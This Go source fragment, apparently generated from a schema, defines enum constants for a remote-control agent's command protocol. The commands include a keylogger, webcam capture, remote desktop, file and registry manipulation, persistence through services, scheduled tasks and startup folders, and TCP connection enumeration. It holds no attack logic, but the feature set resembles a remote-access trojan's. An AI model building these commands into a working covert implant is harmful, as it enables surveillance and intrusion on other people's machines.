	Get          ClipboardCommandPayloadAction = "get"
	PurpleSet    ClipboardCommandPayloadAction = "set"
	SyncTriggers ClipboardCommandPayloadAction = "sync-triggers"
)

type Format string

const (
	Files   Format = "files"
	HTML    Format = "html"
	Image   Format = "image"
	Rtf     Format = "rtf"
	Text    Format = "text"
	Unknown Format = "unknown"
)

type ActionType string

const (
	Command ActionType = "command"
	Notify  ActionType = "notify"
)

type FluffyType string

const (
	FluffyKey   FluffyType = "key"
	MouseButton FluffyType = "mouse-button"
	MouseMove   FluffyType = "mouse-move"
	MouseScroll FluffyType = "mouse-scroll"
)

type CommandOutputEventType string

const (
	Chunk CommandOutputEventType = "chunk"
	End   CommandOutputEventType = "end"
)

type EnvironmentCommandPayloadAction string

const (
	ActionList   EnvironmentCommandPayloadAction = "list"
	ActionRemove EnvironmentCommandPayloadAction = "remove"
	FluffySet    EnvironmentCommandPayloadAction = "set"
)

type EnvironmentCommandPayloadScope string

const (
	PurpleMachine EnvironmentCommandPayloadScope = "machine"
	PurpleUser    EnvironmentCommandPayloadScope = "user"
)

type FileManagerCommandPayloadAction string

const (
	CreateEntry   FileManagerCommandPayloadAction = "create-entry"
	DeleteEntry   FileManagerCommandPayloadAction = "delete-entry"
	ListDirectory FileManagerCommandPayloadAction = "list-directory"
	MoveEntry     FileManagerCommandPayloadAction = "move-entry"
	ReadFile      FileManagerCommandPayloadAction = "read-file"
	RenameEntry   FileManagerCommandPayloadAction = "rename-entry"
	UpdateFile    FileManagerCommandPayloadAction = "update-file"
)

type FileManagerCommandPayloadEncoding string

const (
	Base64 FileManagerCommandPayloadEncoding = "base64"
	UTF8   FileManagerCommandPayloadEncoding = "utf-8"
)

type EntryType string

const (
	Directory EntryType = "directory"
	File      EntryType = "file"
)

type GeoCommandPayloadAction string

const (
	Lookup       GeoCommandPayloadAction = "lookup"
	PurpleStatus GeoCommandPayloadAction = "status"
)

type Provider string

const (
	DBIP    Provider = "db-ip"
	Ipinfo  Provider = "ipinfo"
	Maxmind Provider = "maxmind"
)

type KeyloggerCommandPayloadAction string

const (
	StickyStart        KeyloggerCommandPayloadAction = "start"
	StickyStop         KeyloggerCommandPayloadAction = "stop"
	TentacledConfigure KeyloggerCommandPayloadAction = "configure"
)

type ConfigMode string

const (
	ModeOffline ConfigMode = "offline"
	Standard    ConfigMode = "standard"
)

type Hive string

const (
	HkeyCurrentUser  Hive = "HKEY_CURRENT_USER"
	HkeyLocalMachine Hive = "HKEY_LOCAL_MACHINE"
	HkeyUsers        Hive = "HKEY_USERS"
)

type PurpleOperation string

const (
	Delete          PurpleOperation = "delete"
	OperationUpdate PurpleOperation = "update"
	PurpleCreate    PurpleOperation = "create"
	PurpleList      PurpleOperation = "list"
)

type Target string

const (
	TargetKey Target = "key"
	Value     Target = "value"
)

type ValueType string

const (
	RegBinary   ValueType = "REG_BINARY"
	RegDword    ValueType = "REG_DWORD"
	RegExpandSz ValueType = "REG_EXPAND_SZ"
	RegMultiSz  ValueType = "REG_MULTI_SZ"
	RegQword    ValueType = "REG_QWORD"
	RegSz       ValueType = "REG_SZ"
)

type RemoteDesktopCommandPayloadAction string

const (
	FluffyInput     RemoteDesktopCommandPayloadAction = "input"
	IndigoStart     RemoteDesktopCommandPayloadAction = "start"
	IndigoStop      RemoteDesktopCommandPayloadAction = "stop"
	StickyConfigure RemoteDesktopCommandPayloadAction = "configure"
)

type Encoder string

const (
	AVC         Encoder = "avc"
	EncoderAuto Encoder = "auto"
	Hevc        Encoder = "hevc"
	JPEG        Encoder = "jpeg"
)

type Hardware string

const (
	Avoid        Hardware = "avoid"
	HardwareAuto Hardware = "auto"
	Prefer       Hardware = "prefer"
)

type SettingsMode string

const (
	Images SettingsMode = "images"
	Video  SettingsMode = "video"
)

type FluffyQuality string

const (
	PurpleHigh   FluffyQuality = "high"
	PurpleLow    FluffyQuality = "low"
	PurpleMedium FluffyQuality = "medium"
	QualityAuto  FluffyQuality = "auto"
)

type SettingsTransport string

const (
	HTTP   SettingsTransport = "http"
	Webrtc SettingsTransport = "webrtc"
)

type DefinitionScope string

const (
	FluffyMachine      DefinitionScope = "machine"
	FluffyUser         DefinitionScope = "user"
	ScopeScheduledTask DefinitionScope = "scheduled-task"
)

type Source string

const (
	Other               Source = "other"
	Registry            Source = "registry"
	Service             Source = "service"
	SourceScheduledTask Source = "scheduled-task"
	StartupFolder       Source = "startup-folder"
)

type FluffyOperation string

const (
	FluffyCreate    FluffyOperation = "create"
	FluffyList      FluffyOperation = "list"
	OperationRemove FluffyOperation = "remove"
	Toggle          FluffyOperation = "toggle"
)

type TCPConnectionsCommandPayloadAction string

const (
	FluffyEnumerate TCPConnectionsCommandPayloadAction = "enumerate"
)

type RequestAction string

const (
	FluffyRestart RequestAction = "restart"
	ForceStop     RequestAction = "force-stop"
	IndecentStop  RequestAction = "stop"
	Resume        RequestAction = "resume"
	Suspend       RequestAction = "suspend"
)

type TentacledOperation string

const (
	Action         TentacledOperation = "action"
	Detail         TentacledOperation = "detail"
	OperationStart TentacledOperation = "start"
	TentacledList  TentacledOperation = "list"
)

type TriggerMonitorCommandPayloadAction string

const (
	FluffyStatus    TriggerMonitorCommandPayloadAction = "status"
	IndigoConfigure TriggerMonitorCommandPayloadAction = "configure"
)

type Feed string

const (
	Batch Feed = "batch"
	Live  Feed = "live"
)

type Kind string

const (
	App Kind = "app"
	URL Kind = "url"
)

type WebcamCommandPayloadAction string

const (
	ActionUpdate       WebcamCommandPayloadAction = "update"
	HilariousStop      WebcamCommandPayloadAction = "stop"
	IndecentStart      WebcamCommandPayloadAction = "start"
	TentacledEnumerate WebcamCommandPayloadAction = "enumerate"
)

type TentacledQuality string

const (
	FluffyHigh   TentacledQuality = "high"
	FluffyLow    TentacledQuality = "low"
	FluffyMedium TentacledQuality = "medium"
	Max          TentacledQuality = "max"
)
